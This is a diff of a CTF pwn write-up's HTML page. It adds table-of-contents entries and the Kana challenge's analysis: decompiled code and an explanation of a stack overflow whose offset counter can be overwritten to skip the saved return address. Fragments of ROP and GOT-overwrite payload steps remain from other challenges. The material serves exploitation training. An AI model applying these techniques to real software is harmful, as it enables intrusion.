@@ -30,7 +30,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/chovid99.github.io\/posts\/cyber-apocalypse-2023-pwn\/"
-        },"image": ["https:\/\/chovid99.github.io\/C99-web-card.png"],"genre": "posts","keywords": "Writeup, Cyber Apocalypse, htb, pwn, heap, tcache, UDA, Buffer Overflow, ROP","wordcount":  4864 ,
+        },"image": ["https:\/\/chovid99.github.io\/C99-web-card.png"],"genre": "posts","keywords": "Writeup, Cyber Apocalypse, htb, pwn, heap, tcache, UDA, Buffer Overflow, ROP","wordcount":  9111 ,
         "url": "https:\/\/chovid99.github.io\/posts\/cyber-apocalypse-2023-pwn\/","datePublished": "2023-03-23T20:00:01+07:00","dateModified": "2023-03-22T23:20:59+07:00","publisher": {
             "@type": "Organization",
             "name": "Chovid99","logo": "https:\/\/chovid99.github.io\/C99-Black3.png"},"author": {
@@ -76,8 +76,8 @@
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Cyber Apocalypse 2023: Pwn</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="https://twitter.com/Chovid99" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Chovid99</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="Mar 23, 2023">Mar 23, 2023</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;4864 words&nbsp;
-                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;23 minutes&nbsp;</div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="Mar 23, 2023">Mar 23, 2023</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;9111 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;43 minutes&nbsp;</div>
         </div><div class="details toc" id="toc-static"  data-kept="">
                 <div class="details-summary toc-title">
                     <span>Contents</span>
@@ -90,31 +90,57 @@
         <li><a href="#labyrinth">Labyrinth</a>
           <ul>
             <li><a href="#initial-analysis">Initial Analysis</a></li>
-            <li><a href="#solution">Solution</a></li>
+            <li><a href="#solution">Solution</a>
+              <ul>
+                <li><a href="#full-script">Full Script</a></li>
+              </ul>
+            </li>
           </ul>
         </li>
         <li><a href="#pandoras-box">Pandora&rsquo;s Box</a>
           <ul>
             <li><a href="#initial-analysis-1">Initial Analysis</a></li>
-            <li><a href="#solution-1">Solution</a></li>
+            <li><a href="#solution-1">Solution</a>
+              <ul>
+                <li><a href="#full-script-1">Full Script</a></li>
+              </ul>
+            </li>
           </ul>
         </li>
         <li><a href="#void">Void</a>
           <ul>
             <li><a href="#initial-analysis-2">Initial Analysis</a></li>
-            <li><a href="#solution-2">Solution</a></li>
+            <li><a href="#solution-2">Solution</a>
+              <ul>
+                <li><a href="#full-script-2">Full Script</a></li>
+              </ul>
+            </li>
           </ul>
         </li>
         <li><a href="#kana">Kana</a>
           <ul>
             <li><a href="#initial-analysis-3">Initial Analysis</a></li>
-            <li><a href="#solution-3">Solution</a></li>
+            <li><a href="#solution-3">Solution</a>
+              <ul>
+                <li><a href="#leaking-heap-address">Leaking heap address</a></li>
+                <li><a href="#leaking-stack-address">Leaking stack address</a></li>
+                <li><a href="#leaking-libc-address-and-pie-address">Leaking libc address and pie address</a></li>
+                <li><a href="#gain-remote-code-execution">Gain Remote Code Execution</a></li>
+                <li><a href="#full-script-3">Full script</a></li>
+              </ul>
+            </li>
           </ul>
         </li>
         <li><a href="#control-room">Control Room</a>
           <ul>
             <li><a href="#initial-analysis-4">Initial Analysis</a></li>
-            <li><a href="#solution-4">Solution</a></li>
+            <li><a href="#solution-4">Solution</a>
+              <ul>
+                <li><a href="#leaking-libc-address">Leaking libc address</a></li>
+                <li><a href="#gain-remote-code-execution-1">Gain Remote Code Execution</a></li>
+                <li><a href="#full-script-4">Full Script</a></li>
+              </ul>
+            </li>
           </ul>
         </li>
         <li><a href="#math-door">Math Door</a>
@@ -372,6 +398,7 @@
 <li><code>p64(exe.bss()+0x200)</code> (to overwrite the saved rbp)</li>
 <li><code>p64(escape_plan_addr)</code> (to overwrite the stored RIP with the <code>escape_plan</code> address)</li>
 </ul>
+<h4 id="full-script">Full Script</h4>
 <p>Below is my full script to solve the challenge:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -638,6 +665,7 @@
 <li>Forge the code execution flow to get a shell.</li>
 </ul>
 <p>Because the binary is No PIE, we don&rsquo;t need to leak a PIE address, and we can directly use the available PLT that is provided in the binary. We can also use some available gadgets to perform the classic ROP.</p>
+<h4 id="full-script-1">Full Script</h4>
 <p>Below is my full script that performs the above steps to get a shell.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -883,6 +911,7 @@
 <li>With the buffer overflow bug, redirect the execution flow to overwrite the <code>read</code> GOT to <code>one_gadget</code></li>
 <li>And then call the <code>read</code> again. We will get a shell.</li>
 </ul>
+<h4 id="full-script-2">Full Script</h4>
 <p>Below is my full script to solve this challenge:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1003,7 +1032,579 @@
         </div>
     </div>
 <h3 id="initial-analysis-3">Initial Analysis</h3>
+<p>In this challenge, were given a binary file. Let&rsquo;s <code>checksec</code> it first.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">    RELRO:    Full RELRO
+</span></span><span class="line"><span class="cl">    Stack:    No canary found
+</span></span><span class="line"><span class="cl">    NX:       NX enabled
+</span></span><span class="line"><span class="cl">    PIE:      PIE enabled
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>All protections are on except there isn&rsquo;t canary set in the stack.</p>
+<p>Let&rsquo;s try to disassemble the binary one by one.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">void __fastcall __noreturn main(int a1, char **a2, char **a3)
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">  int v3; // ebx
+</span></span><span class="line"><span class="cl">  char v4[80]; // [rsp+10h] [rbp-B0h] BYREF
+</span></span><span class="line"><span class="cl">  char v5[96]; // [rsp+60h] [rbp-60h] BYREF
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  sub_270A(v4, a2, a3);
+</span></span><span class="line"><span class="cl">  sub_75DD();
+</span></span><span class="line"><span class="cl">  while ( 1 )
+</span></span><span class="line"><span class="cl">  {
+</span></span><span class="line"><span class="cl">    sub_6E56(v5, v4);
+</span></span><span class="line"><span class="cl">    v3 = sub_7642(v5);
+</span></span><span class="line"><span class="cl">    sub_6DFC(v5);
+</span></span><span class="line"><span class="cl">    switch ( v3 )
+</span></span><span class="line"><span class="cl">    {
+</span></span><span class="line"><span class="cl">      case 1:
+</span></span><span class="line"><span class="cl">        sub_39FC(v4);
+</span></span><span class="line"><span class="cl">        break;
+</span></span><span class="line"><span class="cl">      case 2:
+</span></span><span class="line"><span class="cl">        sub_3DF8(v4);
+</span></span><span class="line"><span class="cl">        break;
+</span></span><span class="line"><span class="cl">      case 3:
+</span></span><span class="line"><span class="cl">        sub_41EE(v4);
+</span></span><span class="line"><span class="cl">        break;
+</span></span><span class="line"><span class="cl">      case 4:
+</span></span><span class="line"><span class="cl">        sub_46FA(v4);
+</span></span><span class="line"><span class="cl">        break;
+</span></span><span class="line"><span class="cl">      case 5:
+</span></span><span class="line"><span class="cl">        exit(0);
+</span></span><span class="line"><span class="cl">      default:
+</span></span><span class="line"><span class="cl">        continue;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Well, this is a stripped binary. To give us a better understanding, it is better for us to try run the binary first.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">------------------------------------------
+</span></span><span class="line"><span class="cl">[文] : 
+</span></span><span class="line"><span class="cl"> 1 - kata-fy
+</span></span><span class="line"><span class="cl"> 2 - hira-fy
+</span></span><span class="line"><span class="cl"> 3 - alpha-fy
+</span></span><span class="line"><span class="cl"> 4 - new kana
+</span></span><span class="line"><span class="cl"> 5 - exit
+</span></span><span class="line"><span class="cl">&gt;&gt; 4
+</span></span><span class="line"><span class="cl">&gt;&gt; aaaa
+</span></span><span class="line"><span class="cl">------------------------------------------
+</span></span><span class="line"><span class="cl">[文] : aaaa
+</span></span><span class="line"><span class="cl"> 1 - kata-fy
+</span></span><span class="line"><span class="cl"> 2 - hira-fy
+</span></span><span class="line"><span class="cl"> 3 - alpha-fy
+</span></span><span class="line"><span class="cl"> 4 - new kana
+</span></span><span class="line"><span class="cl"> 5 - exit
+</span></span><span class="line"><span class="cl">&gt;&gt; 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Turn out, this binary has 5 menu, where the fourth menu can be used to generate a new <code>kana</code>, and the value will be printed each time the binary print the menu. I spent quite a lot time on this challenge to find where is the bug, but turn out the first, second, and third menu is actually just a rabbit hole.</p>
+<p>The bug was in the print menu function itself, especially during reading what option we will choose. Below is the disassemby of thhe print menu function.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">sub_7642</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kr">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// rbx
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">s</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span> <span class="c1">// [rsp+10h] [rbp-70h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v11</span><span class="p">[</span><span class="mi">44</span><span class="p">];</span> <span class="c1">// [rsp+40h] [rbp-40h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v12</span><span class="p">;</span> <span class="c1">// [rsp+6Ch] [rbp-14h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">memset</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">s</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v12</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v1</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="k">operator</span><span class="o">&lt;&lt;&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">char_traits</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="o">&amp;</span><span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="p">,</span> <span class="s">&#34;------------------------------------------&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">std</span><span class="o">::</span><span class="n">ostream</span><span class="o">::</span><span class="k">operator</span><span class="o">&lt;&lt;</span><span class="p">(</span><span class="n">v1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="o">&lt;</span><span class="kt">char</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">char_traits</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;&gt;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v2</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="k">operator</span><span class="o">&lt;&lt;&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">char_traits</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="o">&amp;</span><span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">unk_819B</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">sub_476E</span><span class="p">(</span><span class="n">v11</span><span class="p">,</span> <span class="n">a1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v3</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="k">operator</span><span class="o">&lt;&lt;&lt;</span><span class="kt">char</span><span class="o">&gt;</span><span class="p">(</span><span class="n">v2</span><span class="p">,</span> <span class="n">v11</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">std</span><span class="o">::</span><span class="n">ostream</span><span class="o">::</span><span class="k">operator</span><span class="o">&lt;&lt;</span><span class="p">(</span><span class="n">v3</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="o">&lt;</span><span class="kt">char</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">char_traits</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;&gt;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="o">::~</span><span class="n">string</span><span class="p">(</span><span class="n">v11</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v4</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="k">operator</span><span class="o">&lt;&lt;&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">char_traits</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="o">&amp;</span><span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="p">,</span> <span class="s">&#34; 1 - kata-fy&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">std</span><span class="o">::</span><span class="n">ostream</span><span class="o">::</span><span class="k">operator</span><span class="o">&lt;&lt;</span><span class="p">(</span><span class="n">v4</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="o">&lt;</span><span class="kt">char</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">char_traits</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;&gt;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v5</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="k">operator</span><span class="o">&lt;&lt;&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">char_traits</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="o">&amp;</span><span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="p">,</span> <span class="s">&#34; 2 - hira-fy&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">std</span><span class="o">::</span><span class="n">ostream</span><span class="o">::</span><span class="k">operator</span><span class="o">&lt;&lt;</span><span class="p">(</span><span class="n">v5</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="o">&lt;</span><span class="kt">char</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">char_traits</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;&gt;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v6</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="k">operator</span><span class="o">&lt;&lt;&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">char_traits</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="o">&amp;</span><span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="p">,</span> <span class="s">&#34; 3 - alpha-fy&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">std</span><span class="o">::</span><span class="n">ostream</span><span class="o">::</span><span class="k">operator</span><span class="o">&lt;&lt;</span><span class="p">(</span><span class="n">v6</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="o">&lt;</span><span class="kt">char</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">char_traits</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;&gt;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v7</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="k">operator</span><span class="o">&lt;&lt;&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">char_traits</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="o">&amp;</span><span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="p">,</span> <span class="s">&#34; 4 - new kana&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">std</span><span class="o">::</span><span class="n">ostream</span><span class="o">::</span><span class="k">operator</span><span class="o">&lt;&lt;</span><span class="p">(</span><span class="n">v7</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="o">&lt;</span><span class="kt">char</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">char_traits</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;&gt;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v8</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="k">operator</span><span class="o">&lt;&lt;&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">char_traits</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="o">&amp;</span><span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="p">,</span> <span class="s">&#34; 5 - exit&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">std</span><span class="o">::</span><span class="n">ostream</span><span class="o">::</span><span class="k">operator</span><span class="o">&lt;&lt;</span><span class="p">(</span><span class="n">v8</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="o">&lt;</span><span class="kt">char</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">char_traits</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;&gt;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">std</span><span class="o">::</span><span class="k">operator</span><span class="o">&lt;&lt;&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">char_traits</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="o">&amp;</span><span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="p">,</span> <span class="s">&#34;&gt;&gt; &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">memset</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">s</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">s</span> <span class="o">+</span> <span class="n">v12</span><span class="p">,</span> <span class="mi">1uLL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">s</span> <span class="o">+</span> <span class="n">v12</span><span class="p">)</span> <span class="o">==</span> <span class="mi">10</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">++</span><span class="n">v12</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">s</span> <span class="o">+</span> <span class="n">v12</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">atoi</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>s</code> is the array that will be used to store our chosen option. However, notice that the size of <code>s</code> is only <code>6</code>, yet the reading logic is like below:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl">  <span class="kr">__int64</span> <span class="n">s</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span> <span class="c1">// [rsp+10h] [rbp-70h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v11</span><span class="p">[</span><span class="mi">44</span><span class="p">];</span> <span class="c1">// [rsp+40h] [rbp-40h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v12</span><span class="p">;</span> <span class="c1">// [rsp+6Ch] [rbp-14h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">...</span>
+</span></span><span class="line"><span class="cl">  <span class="n">memset</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">s</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">s</span> <span class="o">+</span> <span class="n">v12</span><span class="p">,</span> <span class="mi">1uLL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">s</span> <span class="o">+</span> <span class="n">v12</span><span class="p">)</span> <span class="o">==</span> <span class="mi">10</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">++</span><span class="n">v12</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">s</span> <span class="o">+</span> <span class="n">v12</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">atoi</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">s</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The read was reading our input one-by-one, and will stop only if the read char&rsquo;s input is <code>\n</code>. Also each time it read one byte, it will increment the <code>v12</code> counter, which is stored inside the stack also. Remember that the size of <code>s</code> is only <code>6</code>, which mean this is a buffer overflow bug. So, with this bug, we need to somehow get a shell.</p>
 <h3 id="solution-3">Solution</h3>
+<p>The current problem is that the binary is PIE, so without a leak of either the PIE base or libc, it won&rsquo;t be possible for us to leverage this buffer overflow bug to gain a shell, because usually, we need to overwrite the saved RIP, and up until now, we don&rsquo;t know what should we write to the saved RIP because we don&rsquo;t know the base address.</p>
+<p>However, the setup of this challenge is pretty unique. Notice that the <code>v12</code> variable, which is the counter that is used as the offset of the current read, is placed below thhe <code>s</code> position in the stack. That means, the buffer overflow is actually can also rewrite the <code>v12</code> with a big value, so that after overwriting the <code>v12</code>, we can skip some bytes and directly jump to the desired place that we want. By using this bug, we can actually can still do the buffer overflow without overwriting the saved RIP in the stack. But now, the question is whether there&rsquo;s exist a good target in the stack that resides below the saved RIP.</p>
